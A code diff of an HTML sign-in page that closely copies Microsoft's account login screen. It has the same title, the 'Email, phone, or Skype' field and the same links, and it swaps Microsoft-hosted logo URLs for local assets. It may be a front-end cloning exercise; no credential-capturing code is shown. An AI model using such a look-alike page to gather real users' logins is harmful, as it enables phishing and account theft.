@@ -2,43 +2,41 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-
   <link rel="icon" type="image/svg+xml"
-        href="https://aadcdn.msauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" />
+        href="assets/images/logo_square.ico" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Sign in to your account</title>
-  <link rel="stylesheet" href="/public/styles/style.css">
+  <link rel="stylesheet" href="styles/style.css">
 </head>
 <body>
-<header class="logo">
-</header>
-<main id="app">
-  <div class="sign-in-box">
-    <img class="logo"
-         src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"
-         alt="logo">
+<main id="main">
+  <div class="main-box">
+    <img class="logotype"
+         src="assets/images/logo_rect.svg"
+         alt="company logotype">
     <div class="sing-in-title">Sign in</div>
     <div></div>
-   <input type="email" class="input-text" placeholder="Email, phone, or Skype">
-
-
-    <div class="form-group">No account? <a class="create-account" href="#">Create one!</a></div>
+    <div id="error-message">
+      Enter a valid email address, phone number, or Skype name.
+    </div>
+    <input id="input-field" type="email" class="data-input" placeholder="Email, phone, or Skype">
+    <div class="no-account">No account? <a class="create-account" href="#">Create one!</a></div>
     <a href="#" class="cant-access">Can't access your account?</a>
-    <div class="button-container">
-      <button class="ms-button back">Back</button>
-      <button class="ms-button">Next</button>
+    <div class="buttons-block">
+      <button class="button back">Back</button>
+      <button id="next-button" class="button">Next</button>
     </div>
   </div>
-  <div class="sign-in-options">
-    <div class="sign-in-options-image"></div>
-    <div class="sign-in-options-text">Sign-in options</div>
+  <div class="lower-block">
+    <div class="lower-block-image"></div>
+    <div class="lower-block-text">Sign-in options</div>
   </div>
 </main>
 <footer class="footer">
-  <div class="footer-terms">Terms of use</div>
-  <div class="footer-privacy">Privacy & cookies</div>
-  <a href="#" class="footer-more">...</a>
+  <div class="terms">Terms of use</div>
+  <div class="privacy-cookies">Privacy & cookies</div>
+  <a href="#" class="more">...</a>
 </footer>
-<script type="module" src="/src/App.js"></script>
+<script type="module" src="../src/App.js"></script>
 </body>
 </html>
